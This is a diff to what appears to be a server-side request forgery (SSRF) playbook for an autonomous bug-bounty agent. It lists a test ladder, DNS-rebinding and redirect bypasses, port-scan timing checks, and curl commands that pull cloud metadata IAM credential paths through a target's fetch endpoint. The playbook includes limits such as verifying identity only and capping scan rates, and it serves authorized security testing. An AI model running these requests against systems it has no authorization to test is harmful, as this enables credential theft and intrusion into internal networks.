@@ -45,9 +45,9 @@ The first kind is obvious. The second kind is where the wins live. Always look f
 
 ### Chain 5: DNS rebinding bypassing allowlists
 1. Target validates URL by resolving DNS, checks IP is public, fetches URL
-2. Use a rebind domain (`rbndr.us`, `rebind.it`, custom 2-record domain): first lookup returns public IP, second returns 169.254.169.254
-3. Tools: `singularity` (NCC Group), custom CoreDNS with TTL=0
-4. Works against URL libraries that resolve twice (validate then fetch)
+2. Use a rebind domain (`rbndr.us`, `rebind.it`, or a `$AUTOHUNT_OOB` subdomain with a 2-record TTL=0 setup if the canary supports it): first lookup returns public IP, second returns 169.254.169.254
+3. Works against URL libraries that resolve twice (validate then fetch)
+4. Confirm by watching the `$AUTOHUNT_OOB` canary for the rebind callback, then for the post-rebind internal fetch
 
 ### Chain 6: Headless Chrome → Chrome DevTools Protocol
 (Chains into RCE — see /rce)
@@ -85,14 +85,16 @@ Different libraries parse URLs differently. Common bypasses:
 * Indirect: HTML→PDF, HTML→screenshot, file converter, "Share via email"
 * Hidden: SAML metadata, OIDC discovery, federation endpoints, software updates, license check
 
-### Step 2: For each input, run the test ladder
-1. Submit `https://your-collaborator.example.com/PATH` — does the server fetch?
-2. Capture User-Agent, source IP, headers — fingerprints the fetcher (curl, wget, Java, Go-http-client, Headless Chrome)
-3. Test redirects: collaborator returns 301→`http://169.254.169.254/...` — does it follow?
+### Step 2: For each input, run the test ladder (via the firewalled Bash CLI)
+1. Submit `http://$AUTOHUNT_OOB/ssrf-<input-name>` as the URL value with `curl`/`httpx` — does the server fetch the canary? (Use a unique path per input so the canary log tells you which one fired.)
+2. Inspect the canary hit: User-Agent, source IP, headers — fingerprints the fetcher (curl, wget, Java, Go-http-client, Headless Chrome)
+3. Test redirects: if you can host a redirect on the canary, return 301→`http://169.254.169.254/...` and see if the fetcher follows. Otherwise test internal IPs directly (step 5).
 4. Test cross-protocol redirect: HTTPS→HTTP, HTTP→file://, HTTP→gopher://
-5. Test internal IP directly: `http://169.254.169.254/`, `http://localhost/`, `http://127.0.0.1:port/`
+5. Test internal IP directly: `http://169.254.169.254/`, `http://localhost/`, `http://127.0.0.1:port/` — diff status/timing/body with `curl -w` to read the result
 6. Test parser bypasses (above)
 7. Test DNS rebinding if simple bypasses fail
+
+**If `$AUTOHUNT_OOB` is UNSET:** you have no callback channel. You can still confirm SSRF by reaching an internal target and reading data back (metadata field, internal endpoint body, port-scan timing differential). A purely blind result with no OOB host and no readable internal response is a **LEAD**, not a finding.
 
 ### Step 3: Identify the fetcher
 The User-Agent tells you the library — that tells you what tricks work:
@@ -108,19 +110,33 @@ The User-Agent tells you the library — that tells you what tricks work:
 * If port-scanning, start with cloud-provider-specific internal services (e.g. AWS RDS endpoints, internal ELBs)
 * For PDF/Chrome SSRF: use `<iframe src=...>` or `<img src=...>` inside the rendered HTML — the renderer fetches them server-side
 
-## Impact Demonstration
+## PROOF (autonomous CLI oracle)
 
-* Show the request that triggered the SSRF
-* Show the response containing internal data (metadata, internal endpoint body, port-scan timing)
-* For credentials: show `aws sts get-caller-identity` (or equiv) — DO NOT use the credentials beyond identity verification
-* Categorize: blind (only collaborator hit), semi-blind (timing/error), full read SSRF
-* Document which protocols / IPs are reachable
+Confirm via the firewalled Bash CLI (`curl`/`httpx`) plus the `$AUTOHUNT_OOB` canary. A finding needs one of:
+
+* **Forced OOB callback (blind SSRF):** make the server request `http://$AUTOHUNT_OOB/ssrf-<unique>` and confirm the canary logged the hit. Capture the inbound User-Agent and source IP from the canary record — that proves server-side fetch and fingerprints the library.
+  ```bash
+  # submit the canary URL into the suspected input
+  curl -s -X POST https://target/api/import -d "url=http://$AUTOHUNT_OOB/ssrf-import" \
+    -H 'Content-Type: application/x-www-form-urlencoded'
+  # then check the canary log for a hit on /ssrf-import
+  ```
+* **Metadata read (full-read SSRF):** reach `169.254.169.254` (or the provider IP from Chain 2) and read a real field back in the HTTP response — e.g. an IAM role name or instance-id. A metadata field echoed in the response body is unambiguous proof.
+  ```bash
+  curl -s "https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -w '\n%{http_code} %{time_total}\n'
+  ```
+* **Internal-service read / port-scan differential:** diff `%{http_code}`/`%{time_total}`/body across `curl -w` runs against open vs closed internal ports to prove internal reachability when no full body is returned.
+* For credentials obtained via metadata: show `aws sts get-caller-identity` (or equiv) only — DO NOT use the credentials beyond identity verification, do not exfil customer data.
+* Categorize the result: blind (only canary hit), semi-blind (timing/error differential), full-read SSRF. Document which protocols / IPs are reachable.
+
+**LEAD vs finding:** if `$AUTOHUNT_OOB` is UNSET *and* you cannot reach metadata or read any internal response, the SSRF is unproven → record it as a LEAD with the exact request that *should* trigger it, not as a confirmed finding.
 
 ## Key Considerations
 
 * IMDSv1 is the easy win on AWS — IMDSv2 requires PUT capability (most SSRF can't do PUT, but headless browsers and full URL libs can)
 * Always test the redirect path — many apps validate the URL once, then `requests.get(...follow_redirects=True)` happily follows to internal IPs
-* For blind SSRF, time-based detection (probe a known-closed port vs a known-open one) is your best friend
+* For blind SSRF, time-based detection (probe a known-closed port vs a known-open one) via `curl -w '%{time_total}'` is your best friend when there's no canary
 * `0.0.0.0` is often equivalent to `127.0.0.1` and bypasses naive `127.*` blocklists
 * On K8s, the pod usually has access to: cluster API, kube-dns, sidecar proxy (Envoy/Istio admin port 15000), and any in-namespace services
-* Don't actually scan customer infra at scale — proof of one or two internal services is enough
+* Don't actually scan customer infra at scale — proof of one or two internal services is enough. Any port-scan loop MUST carry the rate caps from TARGET.md
+* `$AUTOHUNT_OOB` may be unset — never gate a *finding* on a callback you can't observe; downgrade to LEAD
